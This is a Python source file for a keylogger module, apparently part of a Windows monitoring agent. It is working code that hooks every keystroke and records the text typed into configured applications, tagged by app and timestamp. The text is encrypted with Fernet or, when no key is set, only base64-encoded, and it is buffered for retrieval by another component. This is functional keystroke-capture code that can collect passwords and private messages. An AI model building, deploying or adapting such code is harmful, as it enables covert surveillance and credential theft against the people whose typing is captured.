# agent/modules/keylogger.py
import os, sys, time, threading, logging, base64
from datetime import datetime, timezone
import win32gui, win32process
import psutil
from pynput import keyboard
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import config

logger = logging.getLogger("keylogger")

_FERNET_KEY = os.environ.get("MONITOR_FERNET_KEY", "")
_fernet = None
if _FERNET_KEY:
    try:
        from cryptography.fernet import Fernet
        _fernet = Fernet(_FERNET_KEY.encode())
    except Exception as e:
        logger.error(f"Invalid Fernet key: {e}")

_buffer: list = []
_buffer_lock  = threading.Lock()
_current: dict = None
_current_text: list = []


def _encrypt(text: str) -> str:
    if _fernet:
        return base64.b64encode(_fernet.encrypt(text.encode())).decode()
    return base64.b64encode(text.encode()).decode()


def _foreground_app() -> str:
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        return psutil.Process(pid).name().lower()
    except Exception:
        return ""


def _monitored(app: str) -> bool:
    return app in {a.lower() for a in config.KEYLOG_APPS}


def _on_press(key):
    global _current, _current_text
    app = _foreground_app()
    if not _monitored(app):
        return
    try:
        char = key.char
    except AttributeError:
        special = {
            keyboard.Key.space:     " ",
            keyboard.Key.enter:     "\n",
            keyboard.Key.tab:       "\t",
            keyboard.Key.backspace: "[BS]",
            keyboard.Key.delete:    "[DEL]",
        }
        char = special.get(key, f"[{str(key).replace('Key.','').upper()}]")

    now = datetime.now(timezone.utc).isoformat()
    if _current is None or _current.get("app") != app:
        if _current and _current_text:
            _current["text_enc"] = _encrypt("".join(_current_text))
            _current["end_utc"]  = now
            with _buffer_lock:
                _buffer.append(dict(_current))
        _current = {"machine": config.MACHINE_NAME, "app": app,
                    "start_utc": now, "end_utc": now, "text_enc": ""}
        _current_text = []
    _current_text.append(char or "")


def _flush_loop():
    global _current, _current_text
    while True:
        time.sleep(config.KEYLOG_FLUSH_EVERY)
        try:
            now = datetime.now(timezone.utc).isoformat()
            if _current and _current_text:
                _current["text_enc"] = _encrypt("".join(_current_text))
                _current["end_utc"]  = now
                with _buffer_lock:
                    _buffer.append(dict(_current))
                _current      = None
                _current_text = []
        except Exception as e:
            logger.error(f"Keylog flush: {e}")


def flush() -> list:
    with _buffer_lock:
        b = list(_buffer)
        _buffer.clear()
    return b


def start():
    if not config.KEYLOG_ENABLED:
        logger.info("Keylogger disabled.")
        return
    if not _FERNET_KEY:
        logger.warning("MONITOR_FERNET_KEY not set — keylog data unencrypted!")
    ft = threading.Thread(target=_flush_loop, daemon=True, name="KeylogFlushThread")
    ft.start()
    listener = keyboard.Listener(on_press=_on_press, suppress=False)
    listener.daemon = True
    listener.start()
    logger.info("Keylogger started (scoped to monitored apps).")
